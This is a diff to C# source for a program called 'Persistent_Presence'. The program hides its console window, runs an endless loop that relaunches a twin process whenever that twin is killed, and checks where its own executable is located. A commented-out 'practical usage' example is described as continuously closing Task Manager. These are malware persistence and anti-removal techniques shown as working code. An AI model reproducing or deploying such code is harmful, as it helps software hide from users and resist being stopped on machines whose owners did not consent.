@@ -5,7 +5,7 @@ using System.Diagnostics;
 
 namespace Persistent_Presence
 {
-    class main
+    class Main_Class
     {
         #region <Hiding console application from taskbar.>
         [DllImport("kernel32.dll")]
@@ -20,21 +20,21 @@ namespace Persistent_Presence
 
         static void Main(string[] args)
         {
-            Persistent_Presence main_program = new Persistent_Presence();
-            main_program.check_executable_location();
-            
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE); // Hide
 
-            Background_Process_Twin main_program2 = new Background_Process_Twin();
+            Persistent_Presence main_program = new Persistent_Presence();
+            Background_Process_Twin backround_twin_process = new Background_Process_Twin();
             while (true)
             {
                 Thread.Sleep(1000); // Sleep reduces CPU Usage from 40% down to 2.1%.
-                if (main_program2.check_processes() == false)
+                if (backround_twin_process.check_processes() == false)
                 {
-                    Debug.WriteLine("[*] Twin Process Dead [2]");
-                    main_program2.execute_twin_process();
+                    Debug.WriteLine("[*] Duplicate Process Dead [2]");
+                    backround_twin_process.execute_twin_process();
                 }
+
+                main_program.check_executable_location();
                 /*
                 #region Example of practical usage (Continuously closes task manager).
                 try
